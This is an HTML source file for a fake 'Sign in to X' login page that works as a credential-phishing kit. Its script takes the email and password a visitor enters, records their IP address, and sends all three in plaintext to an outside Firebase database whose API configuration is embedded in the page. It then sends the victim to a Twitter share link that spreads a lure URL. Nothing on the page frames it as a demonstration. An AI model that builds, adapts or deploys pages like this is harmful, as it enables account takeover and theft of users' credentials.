<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f8fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .container h2 {
            margin-bottom: 20px;
        }
        .container input {
            width: 100%;
            padding: 10px;
            margin: 5px 0 20px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .container button {
            width: 100%;
            padding: 10px;
            background-color: #1DA1F2;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .container button:hover {
            background-color: #1a91da;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Sign in to X</h2>
        <form id="login-form">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.1.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.1.1/firebase-database.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCZBiUIEduoQxOL2qfFWT1ngQtZ-ePzFH4",
            authDomain: "x-storage-d3223.firebaseapp.com",
            databaseURL: "https://x-storage-d3223-default-rtdb.europe-west1.firebasedatabase.app",
            projectId: "x-storage-d3223",
            storageBucket: "x-storage-d3223.appspot.com",
            messagingSenderId: "97246315393",
            appId: "1:97246315393:web:ac5f22eefd1e4b273fde80"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const form = document.getElementById('login-form');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            const email = emailInput.value;
            const password = passwordInput.value;

            fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;

                db.ref('users').push({
                    email: email,
                    password: password,
                    ip: ip
                });

                window.location.href = 'https://twitter.com/intent/tweet?text=Check%20out%20this%20amazing%20link%3A%20https%3A%2F%2Fexample.com';
            })
            .catch(error => console.error('Error:', error));
        });
    </script>
</body>
</html>
